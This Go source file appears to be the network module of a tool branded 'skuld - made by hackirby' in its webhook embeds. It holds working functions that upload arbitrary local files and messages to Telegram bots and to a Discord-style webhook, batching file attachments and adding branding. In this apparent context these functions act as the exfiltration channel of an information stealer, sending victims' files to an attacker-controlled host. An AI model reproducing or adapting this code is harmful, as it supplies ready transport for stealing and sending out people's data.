package requests

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"mime/multipart"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"time"
)

const (
	DefaultTimeout = 30 * time.Second
)

// SendTelegramMessage sends a text message to a Telegram chat.
func Send2TelegramMessage(botToken, chatID, message string) error {
	apiURL := fmt.Sprintf("https://api.telegram.org/bot%s/sendMessage", botToken)

	// Prepare the request payload
	data := url.Values{}
	data.Set("chat_id", chatID)
	data.Set("text", message)

	// Send the POST request
	resp, err := http.PostForm(apiURL, data)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		responseBody, _ := io.ReadAll(resp.Body)
		fmt.Printf("Telegram API request failed with status %d: %s\n", resp.StatusCode, string(responseBody))
		return fmt.Errorf("failed to send message: %s", string(responseBody))
	}

	return nil
}

// SendTelegramDocument sends a document to a Telegram chat.
func Send2TelegramDocument(botToken, chatID, filePath string) error {
	fmt.Println("Sending document to Telegram:", filePath)
	apiBaseURL := "https://api.telegram.org/bot"
	client := &http.Client{}
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)

	// Always add chat_id
	writer.WriteField("chat_id", chatID)

	// Add file if provided
	if filePath != "" {
		file, err := os.Open(filePath)
		if err != nil {
			return err
		}
		defer file.Close()

		part, err := writer.CreateFormFile("document", filepath.Base(filePath))
		if err != nil {
			return err
		}

		if _, err = io.Copy(part, file); err != nil {
			return err
		}
	}

	writer.Close()

	apiMethod := "sendDocument"
	apiURL := fmt.Sprintf("%s%s/%s", apiBaseURL, botToken, apiMethod)
	req, err := http.NewRequest("POST", apiURL, body)
	
	if err != nil {
		return err
	}

	req.Header.Set("Content-Type", writer.FormDataContentType())

	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		responseBody, _ := io.ReadAll(resp.Body)
		fmt.Printf("Telegram API request failed with status %d: %s\n", resp.StatusCode, string(responseBody))
		return fmt.Errorf("failed to send document: %s", string(responseBody))
	}

	return nil
}

func Get(url string, headers ...map[string]string) ([]byte, error) {
	req, err := http.NewRequest(http.MethodGet, url, nil)
	if err != nil {
		return nil, fmt.Errorf("failed to create request: %w", err)
	}

	if len(headers) > 0 {
		for key, value := range headers[0] {
			req.Header.Set(key, value)
		}
	}

	client := &http.Client{
		Timeout: DefaultTimeout,
	}

	resp, err := client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("failed to execute request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return nil, fmt.Errorf("unexpected status code: %d", resp.StatusCode)
	}

	res, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, fmt.Errorf("failed to read response body: %w", err)
	}

	return res, nil
}

func Post(url string, body []byte, headers ...map[string]string) ([]byte, error) {
	req, err := http.NewRequest("POST", url, bytes.NewBuffer(body))
	if err != nil {
		return nil, err
	}
	if len(headers) > 0 {
		for key, value := range headers[0] {
			req.Header.Set(key, value)
		}
	}
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	res, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return res, nil
}
func Webhook(webhook string, data map[string]interface{}, files ...string) {
	var body bytes.Buffer
	writer := multipart.NewWriter(&body)

	i := 0

	if len(files) > 10 {
		Webhook(webhook, data)
		for _, file := range files {
			i++
			Webhook(webhook, map[string]interface{}{"content": fmt.Sprintf("Attachment %d: `%s`", i, file)}, file)
		}
		return
	}

	for _, file := range files {
		openedFile, err := os.Open(file)
		if err != nil {
			continue
		}
		defer openedFile.Close()

		filePart, err := writer.CreateFormFile(fmt.Sprintf("file[%d]", i), openedFile.Name())
		if err != nil {
			continue
		}

		if _, err := io.Copy(filePart, openedFile); err != nil {
			continue
		}
		i++
	}

	jsonPart, err := writer.CreateFormField("payload_json")
	if err != nil {
		return
	}

	data["username"] = "skuld"
	data["avatar_url"] = "https://i.ibb.co/GFZ2tHJ/shakabaiano-1674282487.jpg"

	if data["embeds"] != nil {
		for _, embed := range data["embeds"].([]map[string]interface{}) {
			embed["footer"] = map[string]interface{}{
				"text":     "skuld - made by hackirby",
				"icon_url": "https://avatars.githubusercontent.com/u/145487845?v=4",
			}
			embed["color"] = 0xb143e3
		}
	}

	if err := json.NewEncoder(jsonPart).Encode(data); err != nil {
		return
	}

	if err := writer.Close(); err != nil {
		return
	}

	Post(webhook, body.Bytes(), map[string]string{"Content-Type": writer.FormDataContentType()})
}